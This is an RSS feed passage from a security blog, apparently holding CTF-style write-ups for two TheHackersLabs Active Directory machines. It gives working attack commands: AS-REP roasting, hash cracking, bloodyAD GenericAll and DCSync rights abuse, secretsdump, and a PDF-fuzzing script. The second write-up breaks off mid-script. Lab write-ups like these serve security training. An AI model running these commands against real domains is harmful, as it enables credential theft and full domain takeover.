            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>Responder</category>
            <category>MSSQL</category>
            <category>gMSA</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - B.I.G]]></title>
            <link>https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G</guid>
            <pubDate>Fri, 18 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[B.I.G https://labs.thehackerslabs.com/machine/6 Recon Port scan 使用 nmap 对端口进行扫描 枚举测试 SMB 匿名账户测试 WEB 目录扫描 HTTP 服务 两段歌词的来源 I keep it music music, I eat ...]]></description>
            <content:encoded><![CDATA[
# B.I.G

> https://labs.thehackerslabs.com/machine/6
> 

![image.png](/post-images/TheHackersLabsB%20I%20G/image.png)

## Recon

### Port scan

使用 `nmap` 对端口进行扫描

```bash
➜  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST
Warning: 192.168.212.4 giving up on port because retransmission cap hit (10).
Strange read error from 192.168.212.4 (104 - 'Connection reset by peer')
Nmap scan report for 192.168.212.4
Host is up (0.00037s latency).
Not shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49686/tcp open  unknown
MAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
```

```bash
➜  BIG nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.212.4
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active D➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-18T23:52:36
|_  start_date: 2025-07-18T23:44:01
|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: 15h59m55s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.212.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.13 seconds
```

### 枚举测试

`SMB` 匿名账户测试

```bash
➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

## WEB

### 目录扫描

`HTTP` 服务

![image.png](/post-images/TheHackersLabsB%20I%20G/image1.png)

> 两段歌词的来源
> 
> 
> ### **I keep it music music, I eat that lunch (Yeah)**
> 
> - **来源:** 这句歌词出自 **Travis Scott** 2023年专辑《UTOPIA》中的大热单曲 **《FE!N》**，是客串的歌手 **Playboi Carti** 的部分。
> - **含义解析:** 这句歌词是典型的Playboi Carti风格，用极简但充满态度的语言来表达自己的状态。
>     - **`I keep it music music`**: 这句话的意思是“我的世界里只有音乐，我一直专注于音乐”。他用重复的“music music”来强调自己完全沉浸在创作和音乐的氛围中，这是他生活的核心和全部重心。这是一种对自己艺术家身份的强调。
>     - **`I eat that lunch`**: 这是一句非常形象的俚语，意思是**“我轻松搞定一切”、“我把竞争对手都干掉了”**。想象一下，吃午餐是一件多么轻松日常的事情。他用这个比喻来表示他在说唱游戏（Rap Game）中游刃有余，把击败对手、取得成功看得像吃午饭一样简单。这是一种极度自信和傲慢的炫耀（Bragging）。
> 
> ---
> 
> ### **It was all a dream**
> 
> **它是一个文化符号，是嘻哈历史上最经典、最标志性的开场白之一。**
> 
> - **来源:** 这句歌词出自传奇说唱歌手 **The Notorious B.I.G. (又名 Biggie Smalls)** 在1994年发布的歌曲 **《Juicy》**。这首歌是他的首张专辑《Ready to Die》中的主打单曲，也是他的成名作。
> - **原文和背景:** 完整的开场是：
>     
>     "It was all a dream, I used to read Word Up! magazine
>     Salt-n-Pepa and Heavy D up in the limousine"
>     

---

对网站目录爆破

```bash
➜  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt
                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.212.4
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, zip, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      151c http://192.168.212.4/images => http://192.168.212.4/images/
200      GET       21l       41w      435c http://192.168.212.4/
301      GET        2l       10w      153c http://192.168.212.4/contents => http://192.168.212.4/contents/
[>-------------------] - 5s     48285/2491564 5m      found:3       errors:0      
301      GET        2l       10w      150c http://192.168.212.4/songs => http://192.168.212.4/songs/
200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt
200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt
200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg
200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg
[####################] - 8m   3322088/3322088 0s      found:6       errors:0      
[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ 
[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ 
[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ 
[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/
```

`Skyisthelimit.txt` 还是一个字典

![image.png](/post-images/TheHackersLabsB%20I%20G/image2.png)

![image.png](/post-images/TheHackersLabsB%20I%20G/image3.png)

### 图片隐写

这一部分看了一下 write-up

`notify.txt` 

![image.png](/post-images/TheHackersLabsB%20I%20G/image4.png)

> *“你到底雇了哪个该死的家伙来做这个网站！”
“又把密钥用 MD5 藏起来！”
“我要炒了那个家伙”*
> 

那么密码可能是 `music` 的 `MD5` 值

```bash
➜  BIG echo -n "music" | md5sum                                                 
18d6769919266cd0bd6cd78aa405d5d0  -
```

那么要在哪里使用密码？藏起来感觉是`MISC`了

我们将 `images/big.jpg` 图片下载下来，使用 `steghide` 来导出数据

```bash
➜  BIG steghide extract -sf big1.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big2.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

但是密码不对，主页中还有几段歌词，我们尝试一下

![image.png](/post-images/TheHackersLabsB%20I%20G/image5.png)

```bash
➜  BIG echo -n "I keep it music music" | md5sum
a6002952ffda89154a38a248280093d2  -
➜  BIG echo -n "I eat that lunch (Yeah)" | md5sum
d2b5f22e80f680d9660a1d3ab81232fd  -
➜  BIG echo -n "It was all a dream" | md5sum
99ae77c0c0faf78b872f9f452e3eaa24  -
```

能得到一个文件 `frase.txt` ，使用 MD5 `99ae77c0c0faf78b872f9f452e3eaa24`

```bash
➜  BIG steghide extract -sf big2.jpg            
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big2.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big2.jpg
Enter passphrase: 
wrote extracted data to "frase.txt".
➜  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big3.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big4.jpg  
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
➜  BIG steghide extract -sf big4.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

里边是个密码

```bash
➜  BIG cat frase.txt           
Bigpoppa1972
```

> 声名狼藉先生（The Notorious B.I.G.，1972年5月21日——1997年3月9日）
> 

### 枚举用户名

有了密码，但是不知道的用在哪

根据前面得到的信息，`music` 或者 `Juice`也可能是用户名

```bash
Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I'm going to fire that guy

music
```

测试凭据

```bash
➜  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) 
SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:Bigpoppa1972 

➜  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972
RPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
RPC         192.168.212.4   135    BIG              [+] bbr.thl\music:Bigpoppa1972 

➜  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972
LDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
LDAP        192.168.212.4   389    BIG              [+] bbr.thl\music:Bigpoppa1972 
```

远程登录，进去是`TEMP`用户

![image.png](/post-images/TheHackersLabsB%20I%20G/image6.png)

当前目录下可以拿到 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\music\Documents> type user.txt
53bxxxxxxxxxxxxxxxxxxx
```

## 域分析

收集信息

```bash
➜  ~ bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u music -p Bigpoppa1972
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: bbr.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: BIG.bbr.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: BIG.bbr.thl
INFO: Found 7 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: BIG.bbr.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250718165617_bloodhound.zip
```

用户组信息

![image.png](/post-images/TheHackersLabsB%20I%20G/image7.png)

很明显，目标用户是`SONG`

![image.png](/post-images/TheHackersLabsB%20I%20G/image8.png)

通过 `BLoodhound` 可以看到可以用 `AS-REP` 来打

![image.png](/post-images/TheHackersLabsB%20I%20G/image9.png)

## **AS_REP Roasting**

```bash
➜BIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile users
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$song@BBR.THL:6d769bdfb04e89789dae27e05b47a393$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530
cb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e
ba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352
```

使用 `hashcat` 破解，使用上面的的字典

```bash
➜  BIG hashcat -m 18200 hash Skyisthelimit.txt
```

得到密码 `Passwordsave@`

![image.png](/post-images/TheHackersLabsB%20I%20G/image10.png)

测试凭据

```bash
➜  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ 
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) 
SMB         192.168.212.4   445    BIG              [+] bbr.thl\song:Passwordsave@ 
```

## 权限提升

寻找利用链，重新获取一下数据

```bash
bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u song -p Passwordsave@
```

### 链子 1 ❌

![image.png](/post-images/TheHackersLabsB%20I%20G/image11.png)

将 `Song` 添加 `SPECIAL PERMISSIONS` 

```bash
$SecPassword = ConvertTo-SecureString 'Passwordsave@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('bbr\song', $SecPassword)
Add-DomainGroupMember -Identity 'SPECIAL PERMISSIONS' -Members 'song' -Credential $Cred
```

![image.png](/post-images/TheHackersLabsB%20I%20G/image12.png)

`DACL` 滥用，赋予自己拥有`users`的所有权限

```bash
➜  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'CN=USERS,DC=BBR,DC=THL' song
[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL
```

修改`administrator`密码，失败，因为`administrator` 是保护用户，不能直接修改密码

### 链子 2

我们直接控制域

![image.png](/post-images/TheHackersLabsB%20I%20G/image13.png)

```bash
➜  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'DC=BBR,DC=THL' song                             
[+] song has now GenericAll on DC=BBR,DC=THL
```

再添加一个`Dcsync`权限给自己

```bash
➜  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add dcsync song
[+] song is now able to DCSync
```

`Dcsync`，使用 `secretsdump`

```bash
secretsdump.py bbr.thl/song:'Passwordsave@'@192.168.212.4 -dc-ip 192.168.212.4
```

![image.png](/post-images/TheHackersLabsB%20I%20G/image14.png)

![image.png](/post-images/TheHackersLabsB%20I%20G/image15.png)

读取 `root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root.txt
8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 总结

难点在`Web`上，一时半会写不出来

但是拿到`user`后就很简单了，一把梭哈]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>Domain</category>
            <category>AD</category>
            <category>MISC</category>
            <category>AS_REPRoat</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - BlackGold]]></title>
            <link>https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold</guid>
            <pubDate>Tue, 15 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[BlackGold https://labs.thehackerslabs.com/machine/9 Recon 端口扫描 访问 HTTP 服务，通过IIS搭建 目录扫描，没发现什么可疑的文件夹 页面拉到下面可以下载 PDF 文件 图片上两个PDF内容都都是无用的，我们检查一下PDF元信息 作者信...]]></description>
            <content:encoded><![CDATA[
# BlackGold

> https://labs.thehackerslabs.com/machine/9
> 

![image.png](/post-images/TheHackersLabsBlackGold/image.png)

## Recon

端口扫描

```bash
➜  BlackGold nmap -sP 192.168.56.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST
Nmap scan report for 192.168.56.1
Host is up (0.00030s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00031s latency).
MAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.10
Host is up (0.00038s latency).
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds
```

```bash
➜  BlackGold nmap -sT -min-rate 10000 -p- 192.168.56.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST
Nmap scan report for 192.168.56.10
Host is up (0.00066s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
65047/tcp open  unknown
65051/tcp open  unknown
65052/tcp open  unknown
65062/tcp open  unknown
65071/tcp open  unknown
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
```

```bash
➜  BlackGold nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST
Nmap scan report for 192.168.56.10
Host is up (0.00038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title:  Neptune
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 16:33:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
65047/tcp open  msrpc         Microsoft Windows RPC
65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65052/tcp open  msrpc         Microsoft Windows RPC
65062/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-14T16:34:35
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: -2s

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.56.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.63 seconds
```

访问 `HTTP` 服务，通过`IIS`搭建

![image.png](/post-images/TheHackersLabsBlackGold/image1.png)

目录扫描，没发现什么可疑的文件夹

```bash
➜  BlackGold gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://192.168.56.10/images/]
/docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/docs/]
/Images               (Status: 301) [Size: 151] [--> http://192.168.56.10/Images/]
/css                  (Status: 301) [Size: 148] [--> http://192.168.56.10/css/]
/js                   (Status: 301) [Size: 147] [--> http://192.168.56.10/js/]
/Docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/Docs/]
/fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> http://192.168.56.10/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/Fonts/]
/CSS                  (Status: 301) [Size: 148] [--> http://192.168.56.10/CSS/]
/JS                   (Status: 301) [Size: 147] [--> http://192.168.56.10/JS/]
/DOCS                 (Status: 301) [Size: 149] [--> http://192.168.56.10/DOCS/]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

页面拉到下面可以下载 `PDF` 文件

![image.png](/post-images/TheHackersLabsBlackGold/image2.png)

图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息

```bash
➜  BlackGold pdfinfo 2024-02-15.pdf 
Title:           Certificado de Cumplimiento de Normativas Ambientales
Subject:         
Keywords:        
Author:          James Clear
Creator:         Neptune Oil & Gas
Producer:        pdf-lib (https://github.com/Hopding/pdf-lib)
CreationDate:    Thu Feb 15 11:00:00 2024 CST
ModDate:         
Custom Metadata: no
Metadata Stream: no
Tagged:          yes
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           2
Encrypted:       no
Page size:       596 x 842 pts (A4)
Page rot:        0
File size:       58258 bytes
Optimized:       no
PDF version:     1.7

➜  BlackGold pdfinfo 2024-11-29.pdf 
Title:           Informe de Sostenibilidad 2024
Subject:         Informe sobre sostenibilidad y reducción de emisiones de CO2
Keywords:        
Author:          David Brown
Creator:         Neptune Oil & Gas
Producer:        ReportLab PDF Library - www.reportlab.com
CreationDate:    Thu Feb 27 06:07:22 2025 CST
ModDate:         Thu Feb 27 06:07:22 2025 CST
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       612 x 792 pts (letter)
Page rot:        0
File size:       2110 bytes
Optimized:       no
PDF version:     1.5
```

作者信息中能得到两个用户名`David.Brown` 和 `James.Clear` ，可能是域用户

## **AS_REP Roasting ❌**

得到两个用户名，首先尝试一下 ****`AS_REP Roasting`

```bash
➜  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
```

## 路径爆破

观察到下载`PDF`的路径是：`http://192.168.56.10/docs/2024-11-29.pdf`

是根据日期命名，我们尝试一下通过日期爆破一下

![image.png](/post-images/TheHackersLabsBlackGold/image3.png)

最后能爆破到`192`个`PDF`文档

![image.png](/post-images/TheHackersLabsBlackGold/image4.png)

这里使用`yakit`无法导出文件，所以还是需要写`python`脚本来爆破…

```bash
import requests
import datetime
import os

# --- 配置 ---
HOST = "192.168.56.10"
PORT = 80  # 根据需要修改 HTTP 端口
BASE_URL = f"http://{HOST}:{PORT}"

START_YEAR = 2023
END_YEAR = 2024  # 实际会检查到 2025 年

# 保存下载文件的目录名
OUTPUT_DIR = "found_pdfs"

# --- 主逻辑 ---
def fuzz_and_download():
    """
    遍历指定日期范围，尝试下载 PDF 文件。
    如果服务器返回 200 状态码，则将文件保存到本地。
    """
    print(f"[*] 开始爆破目标: {BASE_URL}")
    print(f"[*] 找到的 PDF 将保存在 ./{OUTPUT_DIR}/ 目录中")

    # 1. 如果输出目录不存在，则创建它
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)
        print(f"[*] 已创建目录: {OUTPUT_DIR}")

    found_files_count = 0

    # 2. 遍历所有可能的日期
    for year in range(START_YEAR, END_YEAR + 1):
        for month in range(1, 13):
            for day in range(1, 32):
                
                # 验证日期是否有效，跳过如 2月30日 等
                try:
                    datetime.date(year, month, day)
                except ValueError:
                    continue

                # 格式化日期和 URL
                date_str = f"{year}-{month:02d}-{day:02d}"
                filename = f"{date_str}.pdf"
                url_path = f"/docs/{filename}"
                full_url = f"{BASE_URL}{url_path}"

                try:
                    # 打印单行进度条，end='\r' 让光标回到行首，实现动态更新
                    print(f"[*] 正在尝试: {full_url}   ", end='\r')

                    # 发送请求，stream=True 用于下载大文件，不会一次性读入内存
                    response = requests.get(full_url, timeout=5, stream=True)

                    # 3. 如果状态码为 200，则保存文件
                    if response.status_code == 200:
                        # 打印成功信息（在新的一行，避免被进度条覆盖）
                        print(f"\n[+] 成功! 找到文件: {full_url} (状态码: 200)")
                        
                        # 定义本地保存路径
                        file_path = os.path.join(OUTPUT_DIR, filename)
                        print(f"    -> 正在保存到: {file_path}...")

                        # 以二进制写模式 ('wb') 打开文件并写入内容
                        with open(file_path, 'wb') as f:
                            for chunk in response.iter_content(chunk_size=8192):
                                f.write(chunk)
                        
                        found_files_count += 1

                except requests.exceptions.RequestException as e:
                    # 如果发生连接错误，打印出来
                    print(f"\n[!] 连接错误: {full_url} - {e}")
    
    # 4. 结束时打印总结
    print("\n\n[*] 爆破完成。")
    if found_files_count > 0:
